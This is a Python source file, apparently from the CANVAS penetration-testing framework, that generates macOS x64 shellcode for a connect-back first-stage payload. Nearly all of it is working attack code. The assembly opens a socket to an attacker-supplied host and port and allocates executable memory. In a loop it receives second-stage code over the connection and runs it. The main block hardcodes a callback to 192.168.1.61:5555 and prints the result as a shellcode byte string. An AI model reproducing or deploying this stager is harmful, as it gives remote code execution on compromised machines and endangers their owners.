#! /usr/bin/env python
# a payload generator for osx64

import sys
import socket
import struct

from basecode64 import basecode
from basecode64 import s_to_push

from MOSDEF import mosdef
from exploitutils import *

import canvasengine
import logging

USEFUL_INFORMATION = """
MACOSX x64 shellcodes use x64 ABI calling convention:
RAX = SYS_NUM + 0x2000000
RDI = 1st arg
RSI = 2nd arg
RDX = 3rd arg
R10 = 4th arg
R8  = 5th arg
R9  = 6th arg

"""

TODO = """
-More ugly shellcodes but null-free.
-Encoders
-HTTP shellcode(?)
"""

class payloads:
    def __init__(self, module = None):
        self.module = module

    def get_basecode(self, **args):
        return basecode( **args )

    def assemble(self, code):
        """ just a little convenience callthrough to mosdef.assemble """
        return mosdef.assemble(code, 'x64')

    def callback(self, host, port, universal = False, fork_exit=False):
        """
        First stage payload for MOSDEF
        """
        codegen = self.get_basecode()
        codegen._globals.addQword('FDSPOT')
        codegen.main = """
        // TODO: XXX
        // for doing things right
        // it shouldn't corrupt anything so
        // check for stack correctness
        // save previous registers(?)

        movq $0xdeadcafedeaddead,%rax
        push %rax
        andl $-16,%rsp

        """
        if fork_exit:
            codegen.main += """
        // fork
        movq $0x2000002,%rax
        syscall
        // if we are parent exit
        test %rdx,%rdx
        jz exit

            """
        codegen.main += """
        //create the socket
        movq $0x2000061,%rax //SYS_socket
        movq $0x2,%rdi       //AF_INET
        movq $0x1,%rsi       //SOCK_STREAM
        movq $0x6,%rdx       //TCP
        syscall

        mov %rax, FDSPOT-getpcloc(%rbp)

        //sockaddr
        xorl %rbx,%rbx
        push %rbx
        movq $REPLACEHOSTANDPORT,%rbx
        push %rbx

        //connect
        movq %rax,%rdi //socket
        movq %rsp,%rsi //sockaddr *name
        movq $0x10,%rdx //namelen
        movq $0x2000062,%rax //SYS_connect
        syscall

        // TODO: error check?

        //free stack
        pop %rax
        pop %rax

        """
        a = istr2int(socket.inet_aton(host))
        b = reverseword((0x02000000 | port))
        host_and_port = "0x%08x%08x" %  (uint_bits(32, a),uint_bits(32,b))
        codegen.main = codegen.main.replace('REPLACEHOSTANDPORT', \
                                            host_and_port)

        if universal == True:
            if (self.module
                and hasattr(self.module, 'engine') == True
                and self.module.engine):

                mosdef_type = self.module.engine.getMosdefType(canvasengine.OSXMOSDEF_X64)
                mosdef_id = self.module.engine.getNewMosdefID(self.module)

            else:
                mosdef_type = 19
                mosdef_id = 0

            logging.info('Using OSX64 Universal, type: %d, id: %d' % (mosdef_type, mosdef_id))

            codegen.main += """
            //align
            push %%rax

            movq $0x%08x%08x,%%rdi // type and ID
            push %%rdi
            mov $8,%%rdi
            mov %%rsp,%%rsi
            call sendloop

            //free stack
            pop %%rax
            pop %%rax
            """ % (socket.htonl(mosdef_id), socket.htonl(mosdef_type))
        codegen.main += """
        //pushl %rbx // treat fd as a local arg

        push %rbx
        push %rbx

	osx64RecvExecCode:
        movq $0x4,%rdi
        movq %rsp,%rsi
        call recvloop

    gogotlen:
        movl (%rsp),%eax
        movl %eax,%eax
        movq %rax,%r12 //code to read

        //allocate buffer (mmap RWX)
        movq $0x20000c5,%rax //SYS_mmap
        xor %rdi,%rdi        // address
        movq %r12,%rsi       // size
        movq $0x7,%rdx       // prot: RWX
        movq $0x1002,%rcx    // flags
        movq %rcx,%r10
        xor %r8,%r8          // fildes
        dec %r8d
        xor %r9,%r9          // off
        syscall

        movq %rax,%r13     // mmap base address saved
        // TODO: check error?, dont think mmap will fail

    recvexe:
        movq %rax,%rsi
        movq %r12,%rdi
        call recvloop

    stagetwo:
        push %r12
        push %r13
        movq FDSPOT-getpcloc(%rbp),%r15 // 2nd stage expects fdsock in r15
        call *%r13
        pop %r13
        pop %r12

        // free mmaped address
        movq %r13,%rdi //addr
        movq %r12,%rsi //len
        movq $0x2000049,%rax //SYS_munmap
        syscall

        jmp osx64RecvExecCode //loop

    exit:

        xor %rdi,%rdi        // status
        movq $0x2000001,%rax // SYS_exit
        syscall

        """

        # sendloop function
        # args:
        #   rdi: length
        #   rsi: buffer
        codegen.main += """
    sendloop:
        push %r12
        push %r13
        movq %rdi,%r12 //len
        movq %rsi,%r13 //buff
    sendloop_one:

        movq FDSPOT-getpcloc(%rbp),%rdi // socket
        movq %r13,%rsi                 // buffer
        movq %r12,%rdx                 // length
        movq $0x2000004,%rax           // SYS_write
        syscall

        cmp $0,%eax
        jg no_send_error

        // TODO: how to retrieve errno?
        // TODO: manage EINTR error and make it retry
        //cmp errno, EINTR //4
        //jz sendloop_one  //try again
        jmp exit

    no_send_error:
        sub %rax,%r12
        add %rax,%r13

        test %r12,%r12
        jne sendloop_one

        pop %r13
        pop %r12
        ret
        """
        # recvloop function
        # args:
        #   rdi: length
        #   rsi: buffer
        codegen.main += """
    recvloop:
        push %r12
        push %r13
        movq %rdi,%r12 //len
        movq %rsi,%r13 //buff

    recvloop_one:
        movq FDSPOT-getpcloc(%rbp),%rdi // socket
        movq %r13,%rsi                 // buffer
        movq %r12,%rdx                 // length
        movq $0x2000003,%rax           // SYS_read
        //xor %rcx,%rcx                  // flags
        //movq $0x200001d,%rax           // SYS_recvfrom
        syscall

        cmp $0,%eax
        jg no_recv_error

        // TODO: same as before, we need errno
        //EINTR

        jmp exit
    no_recv_error:
        sub %rax,%r12
        add %rax,%r13
        test %r12,%r12
        jne recvloop_one

        pop %r13
        pop %r12
        ret
        """
        return codegen.get()

if __name__ == '__main__':
    import sys;
    import struct;
    line = 0
    p = payloads()

    #TODO: un-harcode this
    asm = p.callback("192.168.1.61",5555, universal=False);

    print asm
    bin = p.assemble(asm)
    sys.stderr.write(bin)
    # mod 4 align
    while len(bin) % 4:
        bin += "P"
    for c in bin:
        if not line:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        line += 1
        if line == 16:
            sys.stdout.write("\"\n")
            line = 0
    i = 0
    line = 0
    sys.stdout.write("\n");
    while i < len(bin):
        dword = struct.unpack("<L", bin[i:i+4])[0]
        #sys.stdout.write("0x%.8X, " % dword)
        line += 1
        i += 4
        if line == 4:
            #sys.stdout.write("\n")
            line = 0
    #sys.stdout.write("\n")
